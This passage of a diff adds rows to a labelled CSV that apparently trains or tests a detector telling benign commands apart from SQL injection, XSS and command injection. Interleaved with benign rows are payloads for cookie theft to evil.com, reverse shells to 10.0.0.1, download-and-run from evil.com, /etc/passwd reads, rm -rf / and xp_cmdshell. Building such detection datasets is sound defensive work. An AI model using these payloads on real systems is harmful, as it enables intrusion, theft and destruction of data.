+547,git clone https://github.com/user/repo.git,benign
+548,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+549,npm install express,benign
+550,git clone https://github.com/user/repo.git,benign
+551,docker run nginx,benign
+552,docker run nginx,benign
+553,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+554,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+555,docker run nginx,benign
+556,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+557,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+558,docker run nginx,benign
+559,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+560,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+561,'; exec xp_cmdshell('net user'); --,sql_injection
+562,"' UNION SELECT username,password FROM admin_users --",sql_injection
+563,'; WAITFOR DELAY '0:0:10'--,sql_injection
+564,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+565,'; WAITFOR DELAY '0:0:10'--,sql_injection
+566,admin' --,sql_injection
+567,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+568,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+569,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+570,'; DROP TABLE users; --,sql_injection
+571,')) OR 1=1--,sql_injection
+572,'; exec xp_cmdshell('net user'); --,sql_injection
+573,'; exec xp_cmdshell('net user'); --,sql_injection
+574,' OR 1=1 ORDER BY 1--,sql_injection
+575,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+576,javascript:alert(document.domain),xss
+577,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
+578,<input onfocus=write(1) autofocus>,xss
+579,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+580,<script>alert(document.cookie)</script>,xss
+581,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
+582,<script>alert(document.cookie)</script>,xss
+583,<svg onload=alert(1)>,xss
+584,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+585,<script>alert(document.cookie)</script>,xss
+586,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
+587,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
+588,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+589,javascript:alert(document.domain),xss
+590,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
+591,| cat /etc/passwd,cmd_injection
+592,| cat /etc/passwd,cmd_injection
+593,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
+594,`curl http://evil.com/script.sh | sh`,cmd_injection
+595,| cat /etc/passwd,cmd_injection
+596,& net user administrator /add,cmd_injection
+597,& net user administrator /add,cmd_injection
+598,; wget http://malicious.com/shell.php,cmd_injection
+599,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
+600,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
+601,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+602,docker run nginx,benign
+603,docker run nginx,benign
+604,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+605,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+606,npm install express,benign
+607,docker run nginx,benign
+608,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+609,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+610,npm install express,benign
+611,SELECT price FROM items WHERE id = 209,benign
+612,SELECT price FROM items WHERE id = 209,benign
+613,SELECT price FROM items WHERE id = 209,benign
+614,SELECT price FROM items WHERE id = 209,benign
+615,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+616,git clone https://github.com/user/repo.git,benign
+617,docker run nginx,benign
+618,git clone https://github.com/user/repo.git,benign
+619,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+620,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+621,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+622,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+623,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+624,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+625,curl -I https://api.example.com/status,benign
+626,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+627,docker run nginx,benign
+628,SELECT price FROM items WHERE id = 209,benign
+629,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+630,git clone https://github.com/user/repo.git,benign
+631,docker run nginx,benign
+632,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+633,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+634,git clone https://github.com/user/repo.git,benign
+635,curl -I https://api.example.com/status,benign
+636,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+637,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+638,docker run nginx,benign
+639,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+640,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+641,curl -I https://api.example.com/status,benign
+642,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+643,curl -I https://api.example.com/status,benign
+644,npm install express,benign
+645,git clone https://github.com/user/repo.git,benign
+646,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+647,npm install express,benign
+648,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+649,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+650,git clone https://github.com/user/repo.git,benign
+651,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+652,npm install express,benign
+653,SELECT price FROM items WHERE id = 209,benign
+654,git clone https://github.com/user/repo.git,benign
+655,SELECT price FROM items WHERE id = 209,benign
+656,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+657,git clone https://github.com/user/repo.git,benign
+658,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+659,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+660,git clone https://github.com/user/repo.git,benign
+661,'; exec xp_cmdshell('net user'); --,sql_injection
+662,'; DROP TABLE users; --,sql_injection
+663,'; exec xp_cmdshell('net user'); --,sql_injection
+664,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+665,'; DROP TABLE users; --,sql_injection
+666,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+667,' OR 1=1 ORDER BY 1--,sql_injection
+668,"' UNION SELECT username,password FROM admin_users --",sql_injection
+669,"' UNION SELECT username,password FROM admin_users --",sql_injection
+670,'; exec xp_cmdshell('net user'); --,sql_injection
+671,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+672,"' UNION SELECT username,password FROM admin_users --",sql_injection
+673,'; WAITFOR DELAY '0:0:10'--,sql_injection
+674,admin' --,sql_injection
+675,' OR '1'='1,sql_injection
+676,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+677,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+678,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+679,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
+680,<input onfocus=write(1) autofocus>,xss
+681,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+682,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+683,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
+684,javascript:alert(document.domain),xss
+685,<svg onload=alert(1)>,xss
+686,<script>alert(document.cookie)</script>,xss
+687,<input onfocus=write(1) autofocus>,xss
+688,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+689,<img src=x onerror=alert('XSS')>,xss
+690,<svg onload=alert(1)>,xss
+691,| cat /etc/passwd,cmd_injection
+692,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
+693,| cat /etc/passwd,cmd_injection
+694,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
+695,|| echo 'evil' > script.sh,cmd_injection
+696,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
+697,| cat /etc/passwd,cmd_injection
+698,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
+699,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
+700,; wget http://malicious.com/shell.php,cmd_injection
+701,SELECT price FROM items WHERE id = 209,benign
+702,docker run nginx,benign
+703,git clone https://github.com/user/repo.git,benign
+704,SELECT price FROM items WHERE id = 209,benign
+705,SELECT price FROM items WHERE id = 209,benign
+706,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+707,git clone https://github.com/user/repo.git,benign
+708,curl -I https://api.example.com/status,benign
+709,git clone https://github.com/user/repo.git,benign
+710,docker run nginx,benign
+711,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+712,git clone https://github.com/user/repo.git,benign
+713,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+714,curl -I https://api.example.com/status,benign
+715,git clone https://github.com/user/repo.git,benign
+716,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+717,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+718,SELECT price FROM items WHERE id = 209,benign
+719,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+720,SELECT price FROM items WHERE id = 209,benign
+721,curl -I https://api.example.com/status,benign
+722,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+723,curl -I https://api.example.com/status,benign
+724,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+725,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+726,SELECT price FROM items WHERE id = 209,benign
+727,curl -I https://api.example.com/status,benign
+728,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+729,docker run nginx,benign
+730,curl -I https://api.example.com/status,benign
+731,SELECT price FROM items WHERE id = 209,benign
+732,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+733,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+734,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+735,git clone https://github.com/user/repo.git,benign
+736,SELECT price FROM items WHERE id = 209,benign
+737,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+738,git clone https://github.com/user/repo.git,benign
+739,curl -I https://api.example.com/status,benign
+740,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+741,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+742,git clone https://github.com/user/repo.git,benign
+743,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+744,docker run nginx,benign
+745,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+746,SELECT price FROM items WHERE id = 209,benign
+747,git clone https://github.com/user/repo.git,benign
+748,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+749,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+750,npm install express,benign
+751,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+752,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+753,git clone https://github.com/user/repo.git,benign
+754,SELECT price FROM items WHERE id = 209,benign
+755,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+756,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+757,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+758,SELECT price FROM items WHERE id = 209,benign
+759,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+760,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+761,'; DROP TABLE users; --,sql_injection
+762,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+763,'; WAITFOR DELAY '0:0:10'--,sql_injection
+764,"' UNION SELECT username,password FROM admin_users --",sql_injection
+765,'; exec xp_cmdshell('net user'); --,sql_injection
+766,"' UNION SELECT username,password FROM admin_users --",sql_injection
+767,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+768,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+769,' OR 1=1 ORDER BY 1--,sql_injection
+770,')) OR 1=1--,sql_injection
+771,')) OR 1=1--,sql_injection
+772,'; exec xp_cmdshell('net user'); --,sql_injection
+773,'; DROP TABLE users; --,sql_injection
+774,'; WAITFOR DELAY '0:0:10'--,sql_injection
+775,'; exec xp_cmdshell('net user'); --,sql_injection
+776,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+777,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+778,<svg onload=alert(1)>,xss
+779,<body onload=alert('XSS')>,xss
+780,<body onload=alert('XSS')>,xss
+781,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
+782,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+783,<body onload=alert('XSS')>,xss
+784,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+785,<script>alert(document.cookie)</script>,xss
+786,<body onload=alert('XSS')>,xss
+787,<body onload=alert('XSS')>,xss
+788,<input onfocus=write(1) autofocus>,xss
+789,<img src=x onerror=alert('XSS')>,xss
+790,<script>alert(document.cookie)</script>,xss
+791,|| echo 'evil' > script.sh,cmd_injection
+792,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
+793,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
+794,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
+795,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
+796,; rm -rf /,cmd_injection
+797,|| echo 'evil' > script.sh,cmd_injection
+798,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
+799,& net user administrator /add,cmd_injection
+800,|| echo 'evil' > script.sh,cmd_injection
+801,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+802,npm install express,benign
+803,curl -I https://api.example.com/status,benign
+804,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+805,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+806,SELECT price FROM items WHERE id = 209,benign
+807,git clone https://github.com/user/repo.git,benign
+808,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+809,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+810,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+811,npm install express,benign
+812,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+813,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+814,curl -I https://api.example.com/status,benign
+815,docker run nginx,benign
+816,git clone https://github.com/user/repo.git,benign
+817,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+818,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+819,curl -I https://api.example.com/status,benign
+820,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+821,SELECT price FROM items WHERE id = 209,benign
+822,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+823,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+824,curl -I https://api.example.com/status,benign
+825,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+826,SELECT price FROM items WHERE id = 209,benign
+827,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+828,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+829,git clone https://github.com/user/repo.git,benign
+830,SELECT price FROM items WHERE id = 209,benign
+831,docker run nginx,benign
+832,git clone https://github.com/user/repo.git,benign
+833,docker run nginx,benign
+834,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+835,docker run nginx,benign
+836,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+837,curl -I https://api.example.com/status,benign
+838,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+839,SELECT price FROM items WHERE id = 209,benign
+840,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+841,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+842,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+843,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+844,docker run nginx,benign
+845,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+846,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+847,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+848,SELECT price FROM items WHERE id = 209,benign
+849,git clone https://github.com/user/repo.git,benign
+850,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+851,git clone https://github.com/user/repo.git,benign
+852,git clone https://github.com/user/repo.git,benign
+853,docker run nginx,benign
+854,curl -I https://api.example.com/status,benign
+855,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+856,git clone https://github.com/user/repo.git,benign
+857,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+858,curl -I https://api.example.com/status,benign
+859,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+860,SELECT price FROM items WHERE id = 209,benign
+861,'; WAITFOR DELAY '0:0:10'--,sql_injection
+862,' OR '1'='1,sql_injection
+863,'; exec xp_cmdshell('net user'); --,sql_injection
+864,'; exec xp_cmdshell('net user'); --,sql_injection
+865,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+866,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+867,' OR 1=1 ORDER BY 1--,sql_injection
+868,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+869,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+870,'; DROP TABLE users; --,sql_injection
+871,'; exec xp_cmdshell('net user'); --,sql_injection
+872,'; WAITFOR DELAY '0:0:10'--,sql_injection
+873,admin' --,sql_injection
+874,' OR '1'='1,sql_injection
+875,' OR 1=1 ORDER BY 1--,sql_injection
+876,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+877,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+878,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
+879,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
+880,<script>alert(document.cookie)</script>,xss
+881,<body onload=alert('XSS')>,xss
+882,javascript:alert(document.domain),xss
+883,<iframe src='javascript:alert(`xss`)'></iframe>,xss
+884,<script>alert(document.cookie)</script>,xss
+885,<body onload=alert('XSS')>,xss
+886,javascript:alert(document.domain),xss
+887,<script>alert(document.cookie)</script>,xss
+888,<input onfocus=write(1) autofocus>,xss
+889,<script>alert(document.cookie)</script>,xss
+890,<svg onload=alert(1)>,xss
+891,; wget http://malicious.com/shell.php,cmd_injection
+892,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
+893,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
+894,; wget http://malicious.com/shell.php,cmd_injection
+895,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
+896,`curl http://evil.com/script.sh | sh`,cmd_injection
+897,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
+898,`curl http://evil.com/script.sh | sh`,cmd_injection
+899,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
+900,`curl http://evil.com/script.sh | sh`,cmd_injection
+901,npm install express,benign
+902,curl -I https://api.example.com/status,benign
+903,docker run nginx,benign
+904,git clone https://github.com/user/repo.git,benign
+905,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+906,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+907,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+908,npm install express,benign
+909,docker run nginx,benign
+910,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+911,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+912,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+913,docker run nginx,benign
+914,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+915,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+916,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+917,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+918,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+919,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+920,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+921,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+922,curl -I https://api.example.com/status,benign
+923,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+924,SELECT price FROM items WHERE id = 209,benign
+925,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+926,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+927,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+928,git clone https://github.com/user/repo.git,benign
+929,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+930,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+931,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+932,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+933,git clone https://github.com/user/repo.git,benign
+934,git clone https://github.com/user/repo.git,benign
+935,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+936,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
+937,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+938,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+939,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+940,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+941,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+942,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
+943,npm install express,benign
+944,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+945,SELECT price FROM items WHERE id = 209,benign
+946,git clone https://github.com/user/repo.git,benign
+947,docker run nginx,benign
+948,git clone https://github.com/user/repo.git,benign
+949,npm install express,benign
+950,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
+951,curl -I https://api.example.com/status,benign
+952,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+953,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
+954,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+955,git clone https://github.com/user/repo.git,benign
+956,git clone https://github.com/user/repo.git,benign
+957,SELECT price FROM items WHERE id = 209,benign
+958,npm install express,benign
+959,"<div class='user-profile'>Welcome back, {username}!</div>",benign
+960,curl -I https://api.example.com/status,benign
+961,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+962,' OR 1=1 ORDER BY 1--,sql_injection
+963,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+964,'; WAITFOR DELAY '0:0:10'--,sql_injection
+965,')) OR 1=1--,sql_injection
+966,'; exec xp_cmdshell('net user'); --,sql_injection
+967,'; WAITFOR DELAY '0:0:10'--,sql_injection
+968,'; exec xp_cmdshell('net user'); --,sql_injection
+969,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+970,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+971,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
+972,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
+973,' OR '1'='1,sql_injection
+974,admin' --,sql_injection
+975,'; DROP TABLE users; --,sql_injection
+976,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+977,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
+978,<svg onload=alert(1)>,xss
+979,<input onfocus=write(1) autofocus>,xss
+980,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+981,<input onfocus=write(1) autofocus>,xss
+982,javascript:alert(document.domain),xss
+983,<img src=x onerror=alert('XSS')>,xss
+984,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+985,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+986,<script>alert(document.cookie)</script>,xss
+987,<img src=x onerror=alert('XSS')>,xss
+988,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
+989,<img src=x onerror=alert('XSS')>,xss
+990,<body onload=alert('XSS')>,xss
+991,| cat /etc/passwd,cmd_injection
+992,; rm -rf /,cmd_injection
+993,|| echo 'evil' > script.sh,cmd_injection
+994,; wget http://malicious.com/shell.php,cmd_injection
+995,|| echo 'evil' > script.sh,cmd_injection
+996,| cat /etc/passwd,cmd_injection
+997,& net user administrator /add,cmd_injection
+998,`curl http://evil.com/script.sh | sh`,cmd_injection
+999,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
+1000,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
